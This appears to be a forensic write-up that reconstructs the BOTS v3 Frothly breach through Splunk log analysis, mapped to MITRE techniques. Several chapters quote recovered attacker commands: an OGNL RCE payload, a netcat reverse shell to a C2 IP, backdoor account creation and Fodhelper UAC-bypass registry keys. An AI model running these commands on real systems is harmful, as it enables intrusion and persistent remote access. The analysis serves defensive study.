# Attack Story — BOTS v3 Investigation
## Frothly Enterprise Breach Reconstruction

> This document reconstructs the complete attack against
> Frothly based on real log analysis in Splunk.
---

## The Victim

**Company :** Frothly (fictional craft beer company)
**Infrastructure :** Hybrid — Windows endpoints + Linux servers + AWS Cloud
**Compromised host :** FYODOR-L.froth.ly
**Compromised account :** AzureAD\FyodorMalteskesko

---

## The Story

## Chapter 1 — The Door Left Open (Initial Access)

**Time : 07:05 AM — August 20, 2018**

The attacker discovered that Frothly was running an outdated
Apache Struts application exposed on port 8080. The endpoint
`/frothlyinventory/integration/saveGangster.action` was
vulnerable to OGNL injection — a critical vulnerability
that allows an attacker to execute any command on the
server by simply sending a crafted HTTP request.

The attacker sent 15 POST requests between 07:05 and 07:34,
each containing a malicious OGNL expression in the `name=`
parameter :

```
POST /frothlyinventory/integration/saveGangster.action
User-Agent: python-requests/2.18.4

name=(#cmd='cat /etc/passwd')(#iswin=...)
```

The server executed these commands and returned the output
directly in the HTTP response — confirming full Remote
Code Execution on HOTH.

Commands executed via RCE :
```
cat /etc/passwd     → enumerate all Linux users
sudo bash           → attempt to get root shell
ls /tmp             → explore writable directory
grep tomcat         → find tomcat service files
ls -ltr             → directory listing
```

**Evidence :** Network activity on HOTH spiked from
2 events/minute to 57 events/minute at exactly 07:05 —
the precise moment the exploit began.

**MITRE :** T1190 — Exploit Public-Facing Application

<img width="1919" height="673" alt="Capture d&#39;écran 2026-06-06 183126" src="https://github.com/user-attachments/assets/24f2c04f-cd4d-4116-a1a1-c1979bd17ec2" />

<img width="1502" height="630" alt="Capture d&#39;écran 2026-06-06 183312" src="https://github.com/user-attachments/assets/222bdc70-e1f5-40f0-96c2-eab993d9b665" />

---

### Chapter 2 — Executing the Windows Payload (FYODOR-L)

**Time : ~22:00 — August 20, 2018**

On FYODOR-L, the attacker executed a heavily obfuscated
PowerShell command :

```
powershell.exe -NoP -NonI -W Hidden -enc <Base64_payload>
```

The decoded payload performed multiple evasion steps :

1. **Disabled AMSI** (Windows Antimalware Scan Interface)
   by setting `amsiInitFailed = true` — making the
   antivirus blind to the subsequent execution

2. **Disabled Script Block Logging** — preventing
   PowerShell from recording what was executed

3. **Downloaded an RC4-encrypted payload** from the
   C2 server using WebClient

4. **Executed everything in memory** via
   Invoke-Expression — leaving no files on disk

A malicious executable was then dropped, deliberately
named to look like Internet Explorer :
```
C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe
```

Note the deliberate misspelling — `iexeplorer` vs
the legitimate `iexplore`. Executed from `C:\Windows\Temp\`
which is a classic malware staging location.

**MITRE :** T1059.001, T1027, T1562.001, T1036

<img width="903" height="346" alt="image" src="https://github.com/user-attachments/assets/28e3ce4b-8ded-4fa6-824a-f67d5aabccf3" />

---
### chapter 3 — Defense Evasion
The attacker dropped a malicious executable disguised
as Internet Explorer :

**File :** `C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe`

Why suspicious :
- Fake name mimicking `iexplore.exe` (Internet Explorer)
- Executed from `C:\Windows\Temp\` — classic malware location
- Launched by hidden PowerShell
- Used to send commands to the internal C2 server

<img width="1446" height="739" alt="Capture d&#39;écran 2026-05-23 211713" src="https://github.com/user-attachments/assets/6bbe28e3-aac2-4f5a-87c9-8db54746436a" />

---

### Chapter 4 — Installing the Backdoor (Persistence on Linux)

**Still on HOTH — August 20, 2018**

With full command execution on HOTH, the attacker
immediately created a hidden backdoor Linux account
directly through the OGNL payload :

```bash
useradd -ou tomcat7 -p ilovedaviderve
```

The syslog confirmed :
```
useradd[12815]: new user: name=tomcat7, UID=0, GID=0
```

**Why this is dangerous :**
UID=0 and GID=0 means root privileges. The attacker
disguised a root account as a tomcat service account —
making it look legitimate at first glance.

The attacker then set up a reverse shell using a named
pipe to connect back to the external C2 server :

```bash
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe
```

This gave the attacker an interactive shell on HOTH
through which they could run any command at any time.
A backdoor listener was also opened on port 1337
(process ID 14356) — confirmed by osquery ListeningPorts.

**MITRE :** T1136.001, T1071.001

<img width="1918" height="734" alt="Capture d&#39;écran 2026-06-11 165648" src="https://github.com/user-attachments/assets/29321980-b3b5-4128-ae3c-67341f59518a" />
<img width="1914" height="87" alt="Capture d&#39;écran 2026-06-11 165734" src="https://github.com/user-attachments/assets/850ebe3a-c57e-4a5c-960b-37829a6ad216" />

---

### Chapter 5 — Mapping the Network (Discovery on HOTH)

With a stable foothold on HOTH, the attacker performed
internal reconnaissance — scanning all classic ports
against the local network :

```
Ports scanned : 21, 22, 23, 80, 135, 139, 443, 445, 3389
```

This revealed other machines on the network and which
services were running — essential information for
planning the next move.

**MITRE :** T1046 — Network Service Scanning

<img width="1919" height="741" alt="Capture d&#39;écran 2026-06-11 172646" src="https://github.com/user-attachments/assets/3d416834-7278-4744-9041-0b5419f26aee" />
<img width="1919" height="77" alt="Capture d&#39;écran 2026-06-11 172717" src="https://github.com/user-attachments/assets/74a69abb-3704-46bb-948c-5a9d5d64c97e" />
<img width="1914" height="509" alt="Capture d&#39;écran 2026-06-11 172844" src="https://github.com/user-attachments/assets/9be8ebd4-9e03-4fc2-97c4-94f067355c1c" />

---
### Chapter 6 — The Pivot (From HOTH to Windows) ( to confirm ! ) 

**The missing link — Session Cookie Theft**

Before the exploit at 07:05, a user named FyodorMalteskesko
was normally browsing the SugarCRM application hosted on
HOTH since 06:23 AM — 42 minutes before the attack began.

The same session cookie appeared repeatedly :
```
PHPSESSID=ck2dbgeimem4h653tr1fbubf04
```

**Hypothesis :** Once the attacker compromised HOTH,
they had access to all active web sessions on the server.
By stealing FyodorMalteskesko's SugarCRM session cookie,
the attacker could impersonate him and gain access to
FYODOR-L — his Windows workstation.

This explains why FYODOR-L appears later in the attack
chain without any direct exploitation evidence on
the Windows machine itself.

**MITRE :** T1539 — Steal Web Session Cookie



---
### Chapter 7 — Becoming Administrator (Privilege Escalation)

To gain full administrator access without triggering
a UAC prompt, the attacker used the Fodhelper bypass :

**Step 1 :** Modified a registry key that Windows
auto-elevates without asking the user :
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<img width="1575" height="153" alt="Capture d&#39;écran 2026-06-03 151805" src="https://github.com/user-attachments/assets/3a3fa7d2-9a7e-40c3-9753-70c8896807b1" />

**Step 2 :** Stored the malicious payload in a key
disguised as a Windows Update entry :
```
HKCU\Software\Microsoft\Windows Update\Update
```

<img width="1610" height="154" alt="Capture d&#39;écran 2026-06-03 151517" src="https://github.com/user-attachments/assets/97a0c8ad-4052-4f98-bdcd-c0995d0de2d3" />

**Step 3 :** Launched `fodhelper.exe` — a legitimate
Microsoft binary that auto-elevates. Windows executed
the attacker's payload with full administrator privileges,
no UAC prompt shown to the user.

**Evidence :** Sysmon EventID 13 (Registry Value Set)
confirmed the registry modifications.

**MITRE :** T1548.002, T1112

---

### Chapter 8 — Locking the Backdoor (Persistence on Windows)

With administrator privileges, the attacker created a
permanent backdoor account :

```
net user /add svcvnc Password123!
net localgroup administrators svcvnc /add
```

The name `svcvnc` was chosen to look like a legitimate
Windows service account. The `vnc` suffix suggests
the attacker planned to install VNC for persistent
graphical remote access.

<img width="660" height="451" alt="Capture d&#39;écran 2026-06-03 141048" src="https://github.com/user-attachments/assets/0dfa46b9-7053-4b56-b3c4-559375ae9b58" />

-> Event ID 4720 → account creation

<img width="1301" height="565" alt="Capture d&#39;écran 2026-06-03 133518" src="https://github.com/user-attachments/assets/925abcd7-4fb7-4a4f-9dd9-2d244c1bee3c" />


-> Event ID 4732 → Adding to a Local Group

<img width="1236" height="656" alt="Capture d&#39;écran 2026-06-03 133933" src="https://github.com/user-attachments/assets/3b24d260-e5f9-44e2-8841-ccdbbb1f409b" />


-> Event ID 4732 → Adding to the Administrators group

<img width="1432" height="685" alt="Capture d&#39;écran 2026-06-03 133838" src="https://github.com/user-attachments/assets/ebcec89c-9296-49fa-ba7e-795e2e6d9e12" />



-> Event ID 4722 → Account Activation

<img width="1015" height="540" alt="Capture d&#39;écran 2026-06-03 134604" src="https://github.com/user-attachments/assets/83dab949-ecfc-4eea-a1c9-fd9ed9da1813" />


-> Event ID 4724 → password reset

<img width="1111" height="573" alt="Capture d&#39;écran 2026-06-03 134710" src="https://github.com/user-attachments/assets/f55c412f-5800-474d-9923-d81ae4acc267" />


Account creation confirmed by Windows EventCodes :
```
4720 → Account created
4722 → Account enabled
4724 → Password set
4732 → Added to Administrators group
```

All events occurred within 18 seconds (22:08:17 → 22:08:35)
— indicating an automated script, not manual typing.

**MITRE :** T1136.001, T1098

---
### Chapter 9 — Talking to the Mother Ship (C2 Communications)

Both compromised Windows machines established persistent
connections to the external C2 server :

| Host | C2 IP | Port | Connections |
|------|--------|------|-------------|
| FYODOR-L | 45.77.53.176 | 443 | 3884 |
| FYODOR-L | 45.77.53.176 | 3333 | Tool download (logos.png) |
| ABUNGST-L | 45.77.53.176 | 443 | 1071 |
| HOTH | 45.77.53.176 | 8088 | Reverse shell |

Port 443 was deliberately chosen — it blends with
normal HTTPS traffic and is rarely blocked by firewalls.
The file `logos.png` downloaded from port 3333 was
likely a malicious tool disguised as an image.

The C2 endpoints observed in HTTP traffic :
```
/frothlyinventory/showcase.action
/login/process.php
/news.php
/admin/get.php
```

**MITRE :** T1071.001

<img width="1919" height="585" alt="Capture d&#39;écran 2026-06-11 173253" src="https://github.com/user-attachments/assets/8f614a85-1f35-4e1c-a951-64d4e34f6d18" />

---

### Chapter 10 — Looking for More Targets (Discovery + Lateral Movement)

From FYODOR-L, the attacker performed extensive
internal reconnaissance :

- **WMIC** for system fingerprinting (536 detections)
- **Netstat** to map active connections (78 detections)
- **Registry enumeration** for installed software (1037 detections)
- **SMB scanning** on port 139 toward internal hosts :
```
  192.168.70.186
  192.168.8.103
  192.168.8.116
```

ABUNGST-L was also compromised — evidenced by
1071 C2 connections to 45.77.53.176:443. How ABUNGST-L
was initially compromised remains under investigation.

**MITRE :** T1082, T1049, T1012, T1021.002, T1046

<img width="1196" height="605" alt="Capture d&#39;écran 2026-06-03 160203" src="https://github.com/user-attachments/assets/3c7c41a1-5dd9-4e57-8781-6df4d9dd1162" />

<img width="664" height="328" alt="Capture d&#39;écran 2026-06-03 154315" src="https://github.com/user-attachments/assets/d9a28a81-1039-4592-b829-a25e001a6be6" />

---
| Attribute | Value |
|-----------|-------|
| Attack duration | ~15 hours (07:05 → 22:08) |
| Entry point | Apache Struts RCE on HOTH |
| Hosts compromised | HOTH, FYODOR-L, ABUNGST-L |
| MITRE techniques | 20 across 8 tactics |
| IOCs documented | 30+ |
| Backdoor accounts | tomcat7 (Linux), svcvnc (Windows) |
| C2 server | 45.77.53.176 (ports 443, 8088, 3333) |
| Persistence method | Local accounts + Registry + C2 |
